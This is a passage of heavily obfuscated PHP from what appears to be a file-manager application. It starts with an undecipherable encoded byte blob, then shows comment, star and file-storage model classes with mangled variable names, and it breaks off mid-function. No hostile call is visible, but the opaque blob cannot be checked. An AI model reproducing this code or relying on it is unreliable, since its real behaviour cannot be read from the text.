¹‘êœ\\´3“;œ§ñÆ¤W×ŞuE')."\x3d\xc9\xe\x95\x98\xdb\xab\xf4\x9e\x3a\x21\xd6\x9c\x74\x75\x45\x81\x70\x8d\x55\x2a\x44\xa8\xd4\xdf\x5\xb5\x24\x3e\x4f\x56\x60\xa6\x17\x76\xc2\x34\xe\x92\xa3\x76\x76\xd3\x1b\x3a\x18\x30\xb9".base64_decode('SHZrykXQ7dIb6cHyW1asIQcYRVYghWvugMyIQQJloSKWhmsj46WEqGH6Nh3BFDLh')."\376\15\120\351\145\40\170\3\257\322\103\77\164\345\223\237\66\175\220\63\65\70\54\16\167\331\145\210\120\261\360\76\117\127\376\324\36\173\126\217\155\35\170\123\257\302\103\171".base64_decode('k76z5xNWkN/0fpCwzXM/qYz7wUkDzjeUsR5eroMPqydD3DvISbNcHivuoV2vAEq9')."\x6\xd4\x56\xfe\x92\xa0\x34\xc\x52\xbf\x4b\x56\xce\x47\xae\xe4\x7d\xcc\xe5\x5e\xc5\xc7\x8\x5d\xaf\x19\x79\x27\xb4\xc2\x73\x86\xdf\x5a\x20\xa8\xef\x12\xa6\x2b\xed\xc6\x7a\x8d\xb\x7\x2c\x76".strrev('SaPËÜP¢ÄV L€*8 …Å'."\n".'b…—Ì5g3ÓæV ;-1:‡¦Âéj®Ö¸fMéÇ')."\xe5\xdd\x4f\x22\xdd\x9a\xd5\xe5\x8f\x5d\x7a\x4e\x80\xff\xdd\x86\x11\xdc\x3\x4d\x2a\xe9\x39\x97\x3f\x1a\x5c\x36\x2\x64\x9d\x4a\x1a\x40\xd2\x81\xe8\x51\xf7\x30\xb1\x3e\x86\x2d\x76\x1d\x3d\x2"._kodDe('Lmu13ocYqkDpD5GpwiYXbfvAn1G8Kw5Vf37VqZW6CWw6CQO2+QmUEdTNYGbLICI9EA==')."\x11\xd1\x12\x63\x25\x97\xe8\x98\x5e\x51\x10\xce\x8e\xcf\x45\x22\x89\x8c\x15\x98\x77\x71\x6c\xf7\x2d\x76\x9b\x84\x89\xfe\x17\x13\xc8\x78\x24\xca\x4e\x9\x65\x9f\xa\x3d\xf\x2e\x66\xa8\xa5\xc2".base64_decode('e5SS7sQ3tJtSd5wf9GuOX1qQkvhQd2JkggFFCLbV3VdP8SibKKPfp0yWqJzEk56t').strrev(' Hˆ …	W¥¢òƒo$"Ùb?’­ÚêĞ¾ÁY:rÉSıp“ŸÆfçâ$Á').base64_decode('E7CHicNTYhUZWsItJTVJQcstncKjK704a8rfYtQxpo8xL6+odhd3icJtngeICVby')."\276\112\314\206\210\240\2\201\345\44\203\133\27\53\303\337\151\163\261\66\266\367\161\106\104\340\311\236\232\121\320\373\270\55\240\103\242\11\117\153\223\16\124\161\166\212\257\256".strrev('¼i½w|&:†Â9ëøK¿ÿö#7ét>¥m{líf|ìò¸{.Ë¤x¢á.‘$^R').strrev('´Xµì¥&ekGIË–“…ØÓ?9Œåæ_us'."\n".'[±V9¡÷Ó×à©º~HMåFnH').base64_decode('+Ib5A6OVAl6zOu/Lsb3sVXXyKGx/pYQC83BeqMI6piBGAhfK74fxfEXdXq4lIqMs')."\231\250\25\321\42\314\141\134\220\175\245\60\333\107\274\66\300\170\311\366\267\261\42\143\20\153\1\263\367\57\146\350\210\130\363\3\126\222\61\221\13\124\206\277\222\256\131\160"."\1\345\1\206\131\303\346\313\154\2\135\71\72\75\57\137\322\104\266\74\232\156\23\142\111\103\257\134\165\240\274\44\216\5\344\54\130\307\332\55\301\342\157\231\327\171\37\67"."\257\367\227\127\106\115\34\260\20\45\216\305\26\114\20\105\156\164\310\125\152\205\74\164\325\46\104\232\111\366\115\345\335\313\137\37\25\122\71\374\45\367\227\141\201\156\313\44"."\304\235\33\312\105\71\222\242\253\364\34\367\324\100\331\131\303\60\237\153\370\21\337\46\256\14\15\223\270\275\147\131\173\72\153\210\265\16\254\136\304\112\264\233\142\35\110\17"."\137\343\375\45\34\125\142\267\142\104\172\50\237\340\314\200\116\322\77\7\220\113\306\147\313\57\214\270\163\142\213\2\367\276\132\124\51\131\312\264\154\51\31\207\127\112\213\127"."\x98\x2c\xc3\x90\xe3\xf0\xd3\xc4\x8e\x6b\x2e\xc4\xb\x6\xde\x97\xb\x8\x67\x4f\x99\x75\x17\xcf\xe\xb7\xba\x32\x48\xba\xf4\x44\x84\x77\xda\xfd\x14\xa\x89\x24\x60\xe6\xd3\x14\x4a\x90\xae\xed"."\xdc\xb7\xa6\xdc\x5f\x7b\x19\xd6\x2c\x19\x51\x29\x9a\xe4\x62\xae\xf2\xd0\x2f\x36\x32\x8c\x8\xcf\x17\x24\x9a\x5e\x48\x84\xa4\xf7\xaf\xbd\xb9\xdc\x4f\xa5\x4b\x77\xac\x29\xb2\xf2\xc2\xe5\xd7\x68"."\342\166\117\242\71\130\66\314\25\211\343\300\3\257\364\362\367\240\66\42\10\46\101\227\247\323\355\332\110\205\244\151\306\231\160\50\202\360\244\204\340\222\354\226\205\72\274\76"."\xea\x7d\x0\x39\x20\xdb\x3a\xbb\x12\x96\x43\x85\x5d\xb3\x94\x5f\x5c\xa8\x88\x6e\x62\x58\xa5\xee\x93\x8d\xe6\xce\x2e\xdb\x4d\xf3\x45\x25\x40\xf4\x31\xb\xae\x81\x25\xf1\x40\xd8\xac\x43\xa8\x66".base64_decode('0a5wVl9U6bbS5sn4nKE0xIjG74J6uDosVWHUgyfKlh8vdl+dyrIHaQnouahUnHyt')."\72\151\206\104\345\112\304\252\164\17\261\144\336\56\42\330\261\147\272\6\137\102\221\274\143\220\62\56\107\272\232\343\235\132\302\220\210\345\113\201\171\42\322\245\161\41\167\24"."\x4d\xaf\x7b\x5a\x2f\x67\xf0\xf6\x8c\xe6\xb0\x47\xd\x27\x95\x95\xb8\xa4\xf2\xc8\x72\xb8\x55\x36\xa8\x50\x51\xe5\xf6\x7a\x5b\xc5\xc6\xd4\xcb\x3b\x8a\x42\xca\xda\x23\xe9\x66\x24\xcd\xa\x79\x68"."\213\52\146\243\121\70\247\40\135\135\171\47\31\2\234\227\106\341\274\145\321\54\263\44\152\221\362\71\132\311\236\244\173\345\203\7\362\207\164\205\16\173\270\164\232\164\262\361"."\254\230\270\274\72\130\161\336\324\104\140\121\271\25\102\316\340\271\43\257\324\212\212\211\47\155\205\110\355\71\5\52\341\132\26\123\1\273\12\145\211\162\74\56\342\52\250\156".base64_decode('0DLxGS27xqoQLeuBVNYUiVfc+rZbhcMDlwcGPK0CdQWrDXGNOWNYaLUxjfSpLvxe').strrev('İvè‰ì ,¶Ow{é¹ËñæyEmyÉ%N½Í+,ŞY–Ö!Æ…¤f~L*').base64_decode('7SFX9pBF41klOUlO6BHRCYmDS8WgghCLgICuE9JyWp5EsYg14bLooHQCXDLQ+8lW').strrev('È7îE…'."\r".'q/ £©\'ÑÃâB|YO_qtÅ·ä‹4—>9i„èÒ®zWwˆ¦oÎ|')."\262\45\350\205\174\302\115\51\346\235\23\72\215\45\110\311\25\300\367\46\74\40\237\175\160\143\332\136\362\334\351\12\0\142\124\7\314\61\346\73\23\33\206\213\366\210\233\25"."\x32\x64\x82\x3e\x81\xe5\x27\x2b\xd4\x10\x93\x7b\x3b\x48\x63\x82\xf0\xe6\x82\x5f\xc3\x84\x22\x3c\xb0\x16\x18\x2a\x66\x5c\xd9\xe9\x33\x55\x5c\xd1\xf4\x9b\x4a\x0\x89\xaa\x28\x82\x3a\x5c\x27\x72".strrev('£Fjpª]LºÃ‹-(gp¸²k¬GwTYR‚’\\“E—³ıFŞ,ybD¡İQe$I½0/')."\x22\xdd\xa4\x95\xe4\x42\x70\xb2\x56\x44\x5a\x97\x8a\x96\x90\xab\x67\x21\xa8\x2f\x66\x4d\x26\x7f\x67\x17\x19\x9\x2d\xc7\x38\x76\xc9\x8e\x54\xcf\xb\x6f\x76\x22\x4f\xc1\x48\xd\xb\x41\x9f\x26"."\21\357\66\163\73\311\77\334\217\35\171\124\6\331\42\205\202\260\36\122\27\224\35\57\2\24\373\253\347\173\235\23\322\342\56\75\340\272\163\227\340\144\77\20\4\43\255\71"."\371\240\45\200\351\25\7\110\26\362\226\137\72\220\130\61\0\270\141\207\233\240\304\66\144\16\110\227\12\224\215\1\253\116\30\122\111\327\214\176\273\242\35\55\123\361\352\231"."\x4a\xf6\xf0\x8e\x17\x32\xb7\xff\x3\xee\xab\xde\x41\xc1\xab\x0\x0"."", 10, -8))); goto eç¬‚ÒäßÅ; E·§ŒÓ­±¨: class CommentModel extends ModelBase { protected $tableName = "\x63\157\155\x6d\x65\x6e\x74"; protected $tableMeta = array("\164\x61\142\x6c\x65\x4e\141\x6d\x65" => "\x63\x6f\x6d\x6d\x65\x6e\164\137\155\145\x74\x61", "\155\x65\x74\x61\106\x69\x65\x6c\144" => "\143\157\x6d\155\x65\156\164\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($èÓ¨) { $Ê«³öîè =& $_SERVER[Å¶¨Şêº]; if ($èÓ¨[$Ê«³öîè[1881]]) { $ª²À¦ = $this->where(array($Ê«³öîè[1882] => $èÓ¨[$Ê«³öîè[1881]]))->find(); if (!$ª²À¦ || $ª²À¦[$Ê«³öîè[420]] != $èÓ¨[$Ê«³öîè[420]] || $ª²À¦[$Ê«³öîè[505]] != $èÓ¨[$Ê«³öîè[505]]) { return !1; } $this->where(array($Ê«³öîè[1882] => $èÓ¨[$Ê«³öîè[1881]]))->setAdd($Ê«³öîè[1883], 1); } $èÓ¨[$Ê«³öîè[1884]] = 0; $èÓ¨[$Ê«³öîè[1883]] = 0; $èÓ¨[$Ê«³öîè[747]] = 1; return $this->add($èÓ¨); } public function commentCount($Æ™¹¨ˆ, $á¯À“, $±¸¢“Çé = false) { $»ë³ » =& $_SERVER[Å¶¨Şêº]; if (!$Æ™¹¨ˆ) { return array(); } if (is_string($Æ™¹¨ˆ) || is_int($Æ™¹¨ˆ)) { $Æ™¹¨ˆ = array($Æ™¹¨ˆ); } $é¾ËÏ‚ = array($»ë³ »[505], $»ë³ »[1885] => $»ë³ »[500]); $ğĞ…Ÿ±õ = array($»ë³ »[505] => array($»ë³ »[7], $Æ™¹¨ˆ), $»ë³ »[420] => $á¯À“); if ($±¸¢“Çé) { $ğĞ…Ÿ±õ[$»ë³ »[1663]] = $±¸¢“Çé; } $®Šş¨ø = $this->field($é¾ËÏ‚)->where($ğĞ…Ÿ±õ)->group($»ë³ »[505])->select(); return array_to_keyvalue($®Šş¨ø, $»ë³ »[505], $»ë³ »[500]); } public function starTarget($œŒÌ…Ô, $æËòåÇü) { $É©êÏÛ® =& $_SERVER[Å¶¨Şêº]; $ƒ××¯Ï = $œŒÌ…Ô + self::TYPE_STAR_OFFSET; $˜¯Å˜¬ = array($É©êÏÛ®[1663] => USER_ID, $É©êÏÛ®[420] => $ƒ××¯Ï, $É©êÏÛ®[505] => $æËòåÇü); $ıŒª›×¯ = $this->where($˜¯Å˜¬)->find(); if ($ıŒª›×¯) { return $this->where(array($É©êÏÛ®[408] => $ıŒª›×¯[$É©êÏÛ®[408]]))->delete(); } $ ©û¨Ğ = array($É©êÏÛ®[1881] => 0, $É©êÏÛ®[1663] => USER_ID, $É©êÏÛ®[747] => 1, $É©êÏÛ®[752] => $É©êÏÛ®[12], $É©êÏÛ®[420] => $ƒ××¯Ï, $É©êÏÛ®[505] => $æËòåÇü, $É©êÏÛ®[1884] => 0, $É©êÏÛ®[1883] => 0); return $this->add($ ©û¨Ğ); } public function starTargetCount($Ğ„·ÙéÚ, $ùıáøå®) { $Í²²Åò¡ =& $_SERVER[Å¶¨Şêº]; $úè´ºÓØ = $ùıáøå® + self::TYPE_STAR_OFFSET; $ˆ¦÷ö = $this->commentCount($Ğ„·ÙéÚ, $úè´ºÓØ); $ËŠ«üŸõ = $this->commentCount($Ğ„·ÙéÚ, $úè´ºÓØ, USER_ID); return array($Í²²Åò¡[1886] => $ˆ¦÷ö, $Í²²Åò¡[1887] => $ËŠ«üŸõ); } public function starTargetUserList($ÛÖ‘Õ×, $¿ı’ƒ‘â) { $ĞÆÉº—¡ =& $_SERVER[Å¶¨Şêº]; $¶Çòñ­é = $ÛÖ‘Õ× + self::TYPE_STAR_OFFSET; $ëßà¯ = array($ĞÆÉº—¡[505] => $¿ı’ƒ‘â, $ĞÆÉº—¡[420] => $¶Çòñ­é); $„Õ”Àğ¬ = $this->where($ëßà¯)->count(); $·§´Å– = array($ĞÆÉº—¡[265] => $„Õ”Àğ¬, $ĞÆÉº—¡[1888] => array()); if (!$„Õ”Àğ¬) { return $·§´Å–; } $ê áİòå = $this->field($ĞÆÉº—¡[1663])->where($ëßà¯)->limit(500)->select(); $ê áİòå = array_to_keyvalue($ê áİòå, $ĞÆÉº—¡[12], $ĞÆÉº—¡[1663]); $·§´Å–[$ĞÆÉº—¡[1888]] = Model($ĞÆÉº—¡[513])->userListInfo($ê áİòå); return $·§´Å–; } public function prasiseUserList($²ª¤Êå) { $¯ó’ñ =& $_SERVER[Å¶¨Şêº]; $ ¦è Å‚ = array($¯ó’ñ[1889] => $²ª¤Êå); $ò’¬Ø¥º = $this->where($ ¦è Å‚)->find(); $öÚ§ÖŒ = _get($ò’¬Ø¥º, $¯ó’ñ[1884], 0); $ºÕµÙÅ = array($¯ó’ñ[265] => $öÚ§ÖŒ, $¯ó’ñ[1888] => array()); if (!$öÚ§ÖŒ) { return $ºÕµÙÅ; } $øõµã¥â = Model($¯ó’ñ[1890])->field($¯ó’ñ[1663])->where($ ¦è Å‚)->limit(500)->select(); $øõµã¥â = array_to_keyvalue($øõµã¥â, $¯ó’ñ[12], $¯ó’ñ[1663]); $ºÕµÙÅ[$¯ó’ñ[1888]] = Model($¯ó’ñ[513])->userListInfo($øõµã¥â); return $ºÕµÙÅ; } public function remove($Ìˆßù“­) { $¾éˆ‰Ï =& $_SERVER[Å¶¨Şêº]; $ò‰ÚÍß„ = array($¾éˆ‰Ï[1882] => $Ìˆßù“­); $Û‘ã“Äâ = $this->where($ò‰ÚÍß„)->find(); if ($Û‘ã“Äâ[$¾éˆ‰Ï[1881]]) { $this->where(array($¾éˆ‰Ï[1882] => $Û‘ã“Äâ[$¾éˆ‰Ï[1881]]))->setAdd($¾éˆ‰Ï[1883], -1); } return $this->where($ò‰ÚÍß„)->delete(); } public function edit($ë»şêâ, $Î«Æıöá) { $€ôÄÔÒ =& $_SERVER[Å¶¨Şêº]; $‰ğä“²´ = array($€ôÄÔÒ[1882] => $ë»şêâ); return $this->where($‰ğä“²´)->save(array($€ôÄÔÒ[1891] => $Î«Æıöá)); } public function prasise($ŠÂÁñÄÔ) { $Üá“å€ñ =& $_SERVER[Å¶¨Şêº]; $ÔĞµÔèÅ = Model($Üá“å€ñ[1892]); $ô»ÓÍ½Í = array($Üá“å€ñ[1882] => $ŠÂÁñÄÔ, $Üá“å€ñ[1654] => USER_ID); $Œ§’¿Õ = $ÔĞµÔèÅ->where($ô»ÓÍ½Í)->find(); if (!$Œ§’¿Õ) { $ÔĞµÔèÅ->add($ô»ÓÍ½Í); $‹ÙäĞÄÅ = $this->where(array($Üá“å€ñ[1882] => $ŠÂÁñÄÔ))->setAdd($Üá“å€ñ[1884], 1); } else { $ÔĞµÔèÅ->where($ô»ÓÍ½Í)->delete(); $‹ÙäĞÄÅ = $this->where(array($Üá“å€ñ[1882] => $ŠÂÁñÄÔ))->setAdd($Üá“å€ñ[1884], -1); } return $‹ÙäĞÄÅ; } public function targetInfo($¦Îœ¥ğ£, $°àÀé´œ) { $‚’è«Š÷ =& $_SERVER[Å¶¨Şêº]; $Û“»íõ = array($‚’è«Š÷[585] => $¦Îœ¥ğ£, $‚’è«Š÷[586] => $°àÀé´œ); $ÚØ’Ş™Ò = $this->where($Û“»íõ)->count(); $”¶üœ¨£ = "\x52\x49\x47\x48\x54\x20\112\117\x49\116\40{$this->tablePrefix}\143\x6f\x6d\x6d\145\x6e\x74\x5f\x70\162\141\x69\163\145\40\x73\x74\141\x72\40\157\x6e\40\143\x6f\x6d\155\x65\x6e\x74\56\143\x6f\155\x6d\x65\156\164\111\x44\40\x3d\x20\x73\164\141\x72\56\143\x6f\x6d\155\x65\156\x74\x49\x44"; $Áå‘Ô«ƒ = $this->alias($‚’è«Š÷[364])->where($Û“»íõ)->join($”¶üœ¨£, $‚’è«Š÷[1893])->count(); $¬Á˜Ê×Š = array($‚’è«Š÷[1894] => $ÚØ’Ş™Ò, $‚’è«Š÷[1895] => $Áå‘Ô«ƒ); return $¬Á˜Ê×Š; } public function listData($„Ğœ×ñë) { $ë©áéŞ =& $_SERVER[Å¶¨Şêº]; if (isset($„Ğœ×ñë[$ë©áéŞ[1896]])) { if ($„Ğœ×ñë[$ë©áéŞ[1896]]) { $„Ğœ×ñë[$ë©áéŞ[1889]] = array($ë©áéŞ[1011], intval($„Ğœ×ñë[$ë©áéŞ[1896]])); } unset($„Ğœ×ñë[$ë©áéŞ[1896]]); } if (isset($„Ğœ×ñë[$ë©áéŞ[1897]])) { if ($„Ğœ×ñë[$ë©áéŞ[1897]]) { $„Ğœ×ñë[$ë©áéŞ[1889]] = array($ë©áéŞ[1008], intval($„Ğœ×ñë[$ë©áéŞ[1897]])); } unset($„Ğœ×ñë[$ë©áéŞ[1897]]); } return $this->_listData($„Ğœ×ñë); } private function _listData($ˆîÃß¯ó) { $ñÌ—Õ¤Ÿ =& $_SERVER[Å¶¨Şêº]; $­ëë‚‰ = $this->where($ˆîÃß¯ó)->_makeOrder()->selectPage(100); $this->_listAppendParent($­ëë‚‰[$ñÌ—Õ¤Ÿ[379]]); $this->_listAppendUser($­ëë‚‰[$ñÌ—Õ¤Ÿ[379]]); $this->_listAppendMeta($­ëë‚‰[$ñÌ—Õ¤Ÿ[379]]); return $­ëë‚‰; } private function _makeOrder() { $–‘ÆææÍ =& $_SERVER[Å¶¨Şêº]; $Ä›£É†— = array($–‘ÆææÍ[1884], $–‘ÆææÍ[1883], $–‘ÆææÍ[212]); $¹‹ù©îª = Input::get($–‘ÆææÍ[466], $–‘ÆææÍ[7], $–‘ÆææÍ[432], $Ä›£É†—); $¿Ó¡·Ğ = Input::get($–‘ÆææÍ[467], $–‘ÆææÍ[7], $–‘ÆææÍ[1656], array($–‘ÆææÍ[1898], $–‘ÆææÍ[462])); $·ßŠ²ÉÈ = $¹‹ù©îª . $–‘ÆææÍ[63] . $¿Ó¡·Ğ; return $this->order($·ßŠ²ÉÈ); } private function _listAppendParent(&$üéœ…›) { $—İúøĞ€ =& $_SERVER[Å¶¨Şêº]; $Ú¶Áò° = array_unique(array_to_keyvalue($üéœ…›, $—İúøĞ€[12], $—İúøĞ€[1881])); $Ú¶Áò° = array_remove_value($Ú¶Áò°, $—İúøĞ€[209]); if (!$Ú¶Áò°) { return; } $¹¡éß±ª = $this->where(array($—İúøĞ€[1882] => array($—İúøĞ€[7], $Ú¶Áò°)))->select(); $¹¡éß±ª = array_to_keyvalue($¹¡éß±ª, $—İúøĞ€[1889]); foreach ($üéœ…› as &$©±€ŠşÈ) { if (isset($¹¡éß±ª[$©±€ŠşÈ[$—İúøĞ€[1881]]])) { $©±€ŠşÈ[$—İúøĞ€[1899]] = $¹¡éß±ª[$©±€ŠşÈ[$—İúøĞ€[1881]]]; } } unset($©±€ŠşÈ); } private function _listAppendUser(&$§Üí—Õ) { $Ë¼¸ÒĞÆ =& $_SERVER[Å¶¨Şêº]; $Å”êŞËİ = array_unique(array_to_keyvalue($§Üí—Õ, $Ë¼¸ÒĞÆ[12], $Ë¼¸ÒĞÆ[1663])); $Å”êŞËİ = array_remove_value($Å”êŞËİ, $Ë¼¸ÒĞÆ[209]); if (count($Å”êŞËİ) == 0) { return; } foreach ($§Üí—Õ as $‹ÕôÛ®†) { if (isset($‹ÕôÛ®†[$Ë¼¸ÒĞÆ[1899]])) { $Å”êŞËİ[] = $‹ÕôÛ®†[$Ë¼¸ÒĞÆ[1899]][$Ë¼¸ÒĞÆ[1663]]; } } $ŸøûÄš  = Model($Ë¼¸ÒĞÆ[534])->userListInfo($Å”êŞËİ); foreach ($§Üí—Õ as &$‹ÕôÛ®†) { $‹ÕôÛ®†[$Ë¼¸ÒĞÆ[599]] = $ŸøûÄš [$‹ÕôÛ®†[$Ë¼¸ÒĞÆ[1663]]]; if (isset($‹ÕôÛ®†[$Ë¼¸ÒĞÆ[1899]])) { $‹ÕôÛ®†[$Ë¼¸ÒĞÆ[1899]][$Ë¼¸ÒĞÆ[599]] = $ŸøûÄš [$‹ÕôÛ®†[$Ë¼¸ÒĞÆ[1899]][$Ë¼¸ÒĞÆ[1663]]]; } } unset($‹ÕôÛ®†); } private function _listAppendMeta(&$°İÓÚÑı) { $Üó“ïí =& $_SERVER[Å¶¨Şêº]; $Îƒ÷åç¾ = array_unique(array_to_keyvalue($°İÓÚÑı, $Üó“ïí[12], $Üó“ïí[1889])); $Îƒ÷åç¾ = array_remove_value($Îƒ÷åç¾, $Üó“ïí[209]); if (!$Îƒ÷åç¾) { return; } foreach ($°İÓÚÑı as $»„È‰ê) { if (isset($»„È‰ê[$Üó“ïí[1899]])) { $Îƒ÷åç¾[] = $»„È‰ê[$Üó“ïí[1899]][$Üó“ïí[1889]]; } } $•Ú£ØÓÒ = $this->metaList($Îƒ÷åç¾); if (!$•Ú£ØÓÒ) { return !1; } foreach ($°İÓÚÑı as &$»„È‰ê) { $»„È‰ê[$Üó“ïí[475]] = $•Ú£ØÓÒ[$»„È‰ê[$Üó“ïí[1889]]]; if (isset($»„È‰ê[$Üó“ïí[1899]])) { $»„È‰ê[$Üó“ïí[1899]][$Üó“ïí[475]] = $•Ú£ØÓÒ[$»„È‰ê[$Üó“ïí[1899]][$Üó“ïí[1889]]]; } } unset($»„È‰ê); } private function metaList($Ğ«±¼ªÚ) { $´Í§£¦ =& $_SERVER[Å¶¨Şêº]; if (!$Ğ«±¼ªÚ) { return array(); } $’ŒÕÌë = array($´Í§£¦[1889] => array($´Í§£¦[7], $Ğ«±¼ªÚ)); $¸âİ´ÈÓ = Model($´Í§£¦[1900])->where($’ŒÕÌë)->select(); $¸âİ´ÈÓ = array_to_keyvalue_group($¸âİ´ÈÓ, $´Í§£¦[1889]); foreach ($¸âİ´ÈÓ as $¹ŒíÏ›¦ => $•Ôæœˆê) { $œÈğŞ = array(); foreach ($•Ôæœˆê as $İ†Œ“¦†) { $œÈğŞ[$İ†Œ“¦†[$´Í§£¦[105]]] = $İ†Œ“¦†[$´Í§£¦[384]]; } $¸âİ´ÈÓ[$¹ŒíÏ›¦] = $œÈğŞ; } return $¸âİ´ÈÓ ? $¸âİ´ÈÓ : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\146\151\154\145\x5f\x63\157\x6e\x74\145\156\164\163"; protected $dataAuto = array(array("\143\x72\145\x61\x74\145\124\x69\155\x65", "\x74\x69\x6d\145", "\151\x6e\163\x65\x72\x74", "\x66\165\156\x63\x74\151\157\x6e")); } class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\x66\151\154\145"; protected $tableMeta = array("\164\141\142\x6c\x65\116\141\155\145" => "\x69\x6f\x5f\x66\151\x6c\x65\137\155\145\164\141", "\x6d\x65\x74\x61\x46\151\145\x6c\x64" => "\146\151\x6c\x65\x49\104"); public function fileInfo($—¡İ¾§´) { $Ü˜©Ş¾± =& $_SERVER[Å¶¨Şêº]; static $®˜ø†ß = array(); if (!isset($®˜ø†ß[$—¡İ¾§´])) { $İ‘”– = $Ü˜©Ş¾±[1901]; $¥­øœ¼‡ = Model($Ü˜©Ş¾±[480])->field($İ‘”–)->where(array($Ü˜©Ş¾±[478] => $—¡İ¾§´))->find(); $®˜ø†ß[$—¡İ¾§´] = $¥­øœ¼‡; } return $®˜ø†ß[$—¡İ¾§´]; } public function addFileByContent($·¨µÏÕø = '', $œ»¡ªŸË = '') { $ä˜»‰é¸ =& $_SERVER[Å¶¨Şêº]; $¨Òèø‹· = TEMP_PATH . $ä˜»‰é¸[1902]; if (!is_dir($¨Òèø‹·)) { mk_dir($¨Òèø‹·); } $Ì…Áò‚ª = $¨Òèø‹· . $ä˜»‰é¸[1903] . rand_string(16); file_put_contents($Ì…Áò‚ª, $·¨µÏÕø); $‘—†®³ = $this->addFile($Ì…Áò‚ª, $œ»¡ªŸË, !0); if (file_exists($Ì…Áò‚ª)) { @unlink($Ì…Áò‚ª); } return $‘—†®³; } public function createFileName($Öö®¯©›, $Òòõ‹Ê— = false, $üÈ”æÇµ = false) { $é¶°²‚ı =& $_SERVER[Å¶¨Şêº]; $¤ĞîÓš“ = IO::init($é¶°²‚ı[8]); $È¥ÄˆÀ£ = $this->makeFilePath($Öö®¯©›, $¤ĞîÓš“, $Òòõ‹Ê—, $üÈ”æÇµ); $°¶ÚÀù¬ = $¤ĞîÓš“->pathFather($È¥ÄˆÀ£); static $ø¸¡Ç«ò = false; $ô³’¶”Ù = $é¶°²‚ı[1904] . md5($°¶ÚÀù¬); if (!$ø¸¡Ç«ò && !Cache::get($ô³’¶”Ù)) { $ø¸¡Ç«ò = !0; $Îñ—Ü‚• = IO::mkdir($°¶ÚÀù¬); if (!IO::exist($Îñ—Ü‚• . $é¶°²‚ı[795])) { IO::mkfile($Îñ—Ü‚• . $é¶°²‚ı[795]); } Cache::set($ô³’¶”Ù, 1, 3600 * 2); } return $È¥ÄˆÀ£; } public function makeFilePath($®ÅòêÏş, $¸è³Ä‘, $œº††å¬ = false, $şíÌÂ§ = false) { $š§ıÈã‚ =& $_SERVER[Å¶¨Şêº]; $á³Ï¬õ = Model($š§ıÈã‚[768])->get($š§ıÈã‚[1905]); $İã¨Òê‘ = KodIO::defaultIO() . date($š§ıÈã‚[1906]); $€Šê¥¬â = $İã¨Òê‘ . rand_string(5) . short_id(100); $®ÅòêÏş = str_replace($š§ıÈã‚[8], $š§ıÈã‚[11], KodIO::clear($®ÅòêÏş)); $‰§ëÜšÚ = $¸è³Ä‘->ext($®ÅòêÏş); if (!$®ÅòêÏş) { $á³Ï¬õ = $š§ıÈã‚[1907]; } switch ($á³Ï¬õ) { case $š§ıÈã‚[1908]: $€Šê¥¬â = $€Šê¥¬â . $š§ıÈã‚[10] . $¸è³Ä‘->ext($®ÅòêÏş); if ($‰§ëÜšÚ == $š§ıÈã‚[1845]) { $€Šê¥¬â .= $š§ıÈã‚[1204]; } break; case $š§ıÈã‚[1909]: $íÊ‰§ = Model($š§ıÈã‚[768])->get($š§ıÈã‚[769]); $áÂô³­‹ = substr(md5($š§ıÈã‚[770] . $íÊ‰§ . date($š§ıÈã‚[745])), 0, 8); $Õ¯ô„õÆ = KodIO::defaultDriver(); $İã¨Òê‘ = $š§ıÈã‚[1235] . $Õ¯ô„õÆ[$š§ıÈã‚[408]] . $š§ıÈã‚[418] . date($š§ıÈã‚[1910]) . $áÂô³­‹ . $š§ıÈã‚[8]; if ($‰§ëÜšÚ == $š§ıÈã‚[1845]) { $®ÅòêÏş .= $š§ıÈã‚[1204]; } $Ì©¨ä¨ = $š§ıÈã‚[1911] . $İã¨Òê‘ . $®ÅòêÏş; CacheLock::lock($Ì©¨ä¨); $€Šê¥¬â = $İã¨Òê‘ . $®ÅòêÏş; if (IO::exist($İã¨Òê‘ . $®ÅòêÏş)) { $è›æ“î = substr($®ÅòêÏş, 0, strlen($®ÅòêÏş) - strlen($‰§ëÜšÚ)); $ò…¢ÚÃñ = $şíÌÂ§ ? substr($şíÌÂ§, 0, 5) : ($œº††å¬ ? substr($œº††å¬, 0, 5) : rand_string(5)); $€Šê¥¬â = $İã¨Òê‘ . $è›æ“î . $ò…¢ÚÃñ . $š§ıÈã‚[10] . $‰§ëÜšÚ; } if (IO::isTypeObject($€Šê¥¬â) && !IO::isUploadServer($€Šê¥¬â)) { if (IO::exist($€Šê¥¬â)) { return $€Šê¥¬â; } $å…ÎğÌ = IO::setContent($€Šê¥¬â, $š§ıÈã‚[12]); if (!$å…ÎğÌ) { show_json($š§ıÈã‚[1912], !1); } } CacheLock::unlock($Ì©¨ä¨); break; case $š§ıÈã‚[1907]: break; default: break; } return $€Šê¥¬â; } public function addFileByRemote($„ãÇ“Ÿä, $Ëäü…·, $±©²«è½ = array()) { $ÕËšÉ³º =& $_SERVER[Å¶¨Şêº]; if (!IO::exist($„ãÇ“Ÿä)) { return !1; } $¬³ı·æØ = $±©²«è½[$ÕËšÉ³º[187]] ? $±©²«è½[$ÕËšÉ³º[187]] : $ÕËšÉ³º[12]; $èï¥Ğë‚ = IO::hashMd5($„ãÇ“Ÿä, $¬³ı·æØ); $Ü•¨À = KodIO::defaultDriver(); $Í³²¡¤â = array($ÕËšÉ³º[554] => IO::size($„ãÇ“Ÿä), $ÕËšÉ³º[1913] => 1, $ÕËšÉ³º[429] => $Ëäü…·, $ÕËšÉ³º[806] => $Ü•¨À[$ÕËšÉ³º[408]], $ÕËšÉ³º[430] => $„ãÇ“Ÿä, $ÕËšÉ³º[1914] => $±©²«è½[$ÕËšÉ³º[188]] ? $±©²«è½[$ÕËšÉ³º[188]] : IO::hashSimple($„ãÇ“Ÿä), $ÕËšÉ³º[1915] => $èï¥Ğë‚ ? $èï¥Ğë‚ : $¬³ı·æØ); if ($áÊ«Îƒ = $this->addFileCheckExist($Í³²¡¤â[$ÕËšÉ³º[188]], $Í³²¡¤â[$ÕËšÉ³º[187]], $Í³²¡¤â[$ÕËšÉ³º[87]])) { return $áÊ«Îƒ; } return $this->addFileData($Í³²¡¤â); } private function addFileData($ö©Ëèğ) { $°Üô‘ÂÂ =& 